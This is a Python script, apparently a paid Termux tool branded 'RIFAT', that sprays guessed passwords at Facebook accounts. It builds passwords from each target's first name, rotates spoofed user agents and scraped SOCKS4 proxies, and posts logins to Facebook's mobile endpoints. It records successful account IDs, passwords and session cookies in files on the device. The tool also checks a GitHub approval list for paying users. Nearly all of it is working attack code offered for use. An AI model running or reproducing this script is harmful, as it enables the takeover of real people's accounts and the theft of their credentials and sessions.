#decode by saju x error
import os

os.system('pip install api')
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import requests
import zlib
import platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
os.system('pip install requests futures==2 > /dev/null')
if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r').readlines()) == 1034:
    print('𝑩𝒚𝒑𝒂𝒔𝒔 𝑼𝒔𝒆𝒓')
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-M305M Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.173 Safari/537.36 SznProhlizec/5.4.7']
ua = [
    'Mozilla/5.0 (Linux; Android 9; ELE-L29; HMSCore 6.12.0.301; GMSCore 23.04.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.365 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 13; en-in; SM-M325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; RMX2030 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Soul/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-M022F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67']
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile/15E148 Safari/605.1'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    for x in range(10):
        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b = random.randrange(100, 9999)
        c = random.randrange(100, 9999)
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        h = random.randrange(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
        j = random.randrange(1, 9)
        k = random.randrange(1, 9)
        l = 'Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
        uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
        
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
                    
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
pwpluss = []
pwnya = []
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)
        


def RIFATj(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        


def clear():
    os.system('clear')


def back():
    login()

os.system('clear')
def banner():
    os.system('clear')
    print('\n\x1b[0;98m ██████ \x1b[0;96m  ██ \x1b[0;92m ███████ \x1b[0;93m █████ \x1b[0;94m ████████ \n\x1b[0;98m ██   ██ \x1b[0;96m ██ \x1b[0;92m ██ \x1b[0;93m     ██   ██   \x1b[0;94m ██ \x1b[0;95m  \n\x1b[0;98m ██████  \x1b[0;96m ██ \x1b[0;92m █████ \x1b[0;93m  ███████  \x1b[0;94m  ██ \n\x1b[0;98m ██   ██ \x1b[0;96m ██ \x1b[0;92m ██ \x1b[0;93m     ██   ██   \x1b[0;94m ██ \x1b[0;95m\n\x1b[0;98m ██   ██ \x1b[0;96m ██ \x1b[0;92m ██  \x1b[0;93m    ██   ██   \x1b[0;94m ██ \x1b[0;95m\n\n\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;33m \n------➤𝑶𝒘𝒏𝒆𝒓 = \x1b[1;38m𝑹𝑰𝑭𝑨𝑻\x1b[1;39m     \n------➤𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 = \x1b[1;98mÑøbítá Ñôbî\x1b[1;96m  \n------➤𝑮𝒊𝒕𝒉𝒖𝒃 = \x1b[1;38m𝑹𝑰𝑭𝑨𝑻-𝑽𝑨𝑰143\x1b[1;34m   \n------➤𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑 = 01764796066\x1b[1;35m \n------➤𝑻𝒐𝒐𝒍 = 𝑷𝒂𝒊𝒅\x1b[1;32m   \n------➤Version = 4.7\x1b[1;35m \n\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;31m')


def login():
    banner()
    RIFATj('\x1b[1;96m[1] 𝑭𝒊𝒍𝒆 𝑪𝒍𝒐𝒏𝒊𝒏𝒈\n\x1b[1;92m[2] 𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝑾𝒊𝒕𝒉 𝑨𝒅𝒎𝒊𝒏\n\x1b[0;97m[0] \x1b[0;91m𝑬𝑿𝑰𝑻 𝑻𝑯𝑬 𝑻𝑶𝑶𝑳 ')
    RIFATj('\x1b[0;97m===============================================')
    RIFAT = input('\x1b[1;92m[+] 𝑪𝑯𝑶𝑶𝑺𝑬: ')
    time.sleep(0.01)
    if RIFAT in ('1',):
        crack_file()        
    if RIFAT in ('2', '02'):
        os.system('exit')


def error():
    print(f'''{k}#TRY AGAIN {u}''')
    time.sleep(4)
    back()




def crack_file():
    os.system('clear')
    banner()
    os.system('espeak -a 300 " your file location"')
    print('\x1b[1;32m[ 𝑷𝒖𝒕 𝑭𝒊𝒍𝒆 𝑬𝒙𝒂𝒎𝒑𝒍𝒆:  /sdcard/RIFAT.txt...]')
    o = input('\x1b[1;97m [+] 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑳𝑬 𝑳𝑶𝑪𝑨𝑻𝑰𝑶𝑵 : ')
    try:lin = open(o).read().splitlines()
    except:
            print('File Not Found')
            time.sleep(2)
            back()
    for xid in lin:
        id.append(xid)
    setting()

def setting():
    print('\x1b[0;91m=============================')
    print('\x1b[97;1m[\x1b[92;1m1\x1b[97;1m] \x1b[0;92m𝐂𝐋𝐎𝐍𝐄 𝐎𝐋𝐃 𝐈𝐃𝐳')
    print('\x1b[97;1m[\x1b[92;1m2\x1b[97;1m] \x1b[0;93m𝐂𝐋𝐎𝐍𝐄 𝐍𝐄𝐖 𝐈𝐃𝐳')
    print('\x1b[97;1m[\x1b[92;1m3\x1b[97;1m] \x1b[0;94m𝐂𝐋𝐎𝐍𝐄 𝐌𝐈𝐗 𝐈𝐃𝐳')
    print('\x1b[0;91m=============================')
    hu = input('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m]CHOOSE :\x1b[92;1m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\x1b[0;91m=============================')
    print('\x1b[0;92m𝐌𝐄𝐓𝐇𝐎𝐃 [1]');print('\x1b[0;93m𝐌𝐄𝐓𝐇𝐎𝐃 [2]')
    print('\x1b[0;91m=============================')
    hc = input('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m]CHOOSE :\x1b[92;1m ')
    if hc in ('1', '01'):
        method.append('mobile')
    if hc in ('2', '02'):
        method.append('free')
    else:
        method.append('free')
    passwrd()
    exit()


def passwrd():
    os.system('clear')
    banner()
    print('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m]\x1b[1;92m 𝑼𝑺𝑬𝑹 𝑵𝑨𝑴𝑬\x1b[1;91m :\x1b[1;96m ')
    print('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] \x1b[0;95m𝑻𝑶𝑻𝑨𝑳 𝑰𝑫𝒛 :\x1b[0;97m ' + str(len(id)))
    print('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] \x1b[0;94m𝑪𝒍𝒐𝒏𝒊𝒏𝒈 𝐬𝒑𝒆𝒆𝒅 𝑺𝒖𝒑𝒆𝒓 𝑭𝐚𝒔𝒕🔥')
    print('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] \x1b[0;92m𝑻𝑼𝑹𝑵 𝑶𝑵/𝑶𝑭𝑭 𝑭𝑳𝑰𝑮𝑯𝑻 𝑴𝑶𝑫𝑬 𝑰𝑵 𝑬𝑽𝑬𝑹𝒀 5 𝑴𝑰𝑵𝑼𝑻𝑬')
    print('\x1b[0;97m===============================================')
    pool = tred(max_workers = 30)
    for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append('@' + frs + '123')
                    pwv.append('@' + frs + '1122')
                    pwv.append('@' + frs + '@')
                    pwv.append('@' + frs + '#')
                    pwv.append('@' + frs + '@123')
                    pwv.append('@@' + frs + '@@')
                    pwv.append('@' + frs + '@2211')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(nmf)
                    pwv.append(frs + '@')
                    pwv.append(frs + '@123')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '12')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append('@' + frs + '123')
                    pwv.append('@' + frs + '1122')
                    pwv.append('@' + frs + '@')
                    pwv.append('@' + frs + '#')
                    pwv.append('@' + frs + '@123')
                    pwv.append('@@' + frs + '@@')
                    pwv.append('@' + frs + '@2211')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(nmf)
                    pwv.append(frs + '@')
                    pwv.append(frs + '@123')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '12')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('==========================================')
    print('𝑪𝑳𝑶𝑵𝑰𝑵𝑮 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬......... ')
    print(f'''{h}[{h}??{h}]{h} 𝒀𝒐𝒖𝒓 𝑻𝒐𝒕𝒂𝒍 𝑶𝒌 𝒊𝒅𝒛 : {h}%s ''' % ok)
    input('𝑪𝑳𝑰𝑪𝑲 𝑬𝑵𝑻𝑬𝑹 𝑻𝑶 𝑬𝑿𝑰𝑻<3 ')
    os.system('rifat.py')
def crack(idf, pwv):
    global cp, ok, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'''\r\x1b[100;92m{bo}[𝑹𝑰𝑭𝑨𝑻•𝐌1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]\x1b[0;37m ''')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    try:
        for pw in pwv:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({
                'Host': 'mbasic.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = ";".join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://mbasic.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            }
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)

            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[0;94m[𝑹𝑰𝑭𝑨𝑻-Cp] {idf} • {pw}''')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/RIFAT-M1-Cp.txt', 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1

            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                koki = ";".join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
                print(f'''\r\x1b[0;92m[𝑹𝑰𝑭𝑨𝑻-Ok💚] {idf} • {pw}\n\x1b[0;93m[🌺]= COOKIES • \x1b[0;92m{koki} ''')
                os.system('espeak -a 300 " Rifat,  Ok,  id"')
                open('/sdcard/RIFAT-M1-OK.txt', 'a').write(idf + '|' + pw + '|' + str(coki) + '\n')
                break
            else:
                continue

        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(31)

def crackfree(idf, pwv):
    global cp, ok, loop
    sys.stdout.write(f'''\r{H}[𝑹𝑰𝑭𝑨𝑻•𝐌2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  ''')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    
    try:
        for pw in pwv:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = ";".join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            }
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)

            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[0;95m[{time.strftime('%H:%M')}•𝑹𝑰𝑭𝑨𝑻-Cp] {idf} • {pw}''')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/RIFAT-M2-Cp.txt', 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1

            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                koki = ";".join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
                print(f'''\r\x1b[0;92m[𝑹𝑰𝑭𝑨𝑻-Ok💚] {idf} • {pw}\n\x1b[0;93m[🌺]= COOKIES • \x1b[0;93m{koki} ''')
                os.system('espeak -a 300 " Rifat,  Ok,  id"')
                open('/sdcard/RIFAT-M2-OK.txt', 'a').write(idf + '|' + pw + '|' + str(coki) + '\n')
                break
            else:
                continue

        loop += 1

    except requests.exceptions.ConnectionError:
        time.sleep(31)


def RMX():
    os.system('clear')
    banner()
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '-'.join(uuid)
    dgp = requests.get('https://github.com/Abir-vai/rifat/blob/main/approval1.txt').text
    if id in dgp:
        msg = str(os.geteuid())
        time.sleep(0.3)
        login()
        
    
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m𝑻𝒉𝒊𝒔 𝒕𝒐𝒐𝒍 𝒊𝒔 𝒑𝒂𝒊𝒅 𝒔𝒐 𝒚𝒐𝒖 𝒏𝒆𝒆𝒅 𝒂𝒑𝒑𝒓𝒐𝒗𝒆 𝒇𝒊𝒓𝒔𝒕 💚')
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m7𝑫𝒂𝒚=150𝒕𝒌🌺')
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m15𝑫𝒂𝒚=350𝒕𝒌🌺')
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m30𝑫𝒂𝒚=500𝒕𝒌🌺')
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m𝑭𝑼𝑪𝑲 𝒀𝑶𝑼𝑹 𝑺𝒀𝑺𝑻𝑬𝑴 𝑩𝒀𝑷𝑨𝑺𝑺 𝑼𝑺𝑬𝑹_😹')
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m𝒀𝑶𝑼𝑹 𝑲𝑬𝒀 :\x1b[1;92m ABIR=' + id)
    print('\x1b[1;97m┗─────────────────────────────────────────┛')
    os.system('')
    time.sleep(3)
    sys.exit()
 
    

RMX()
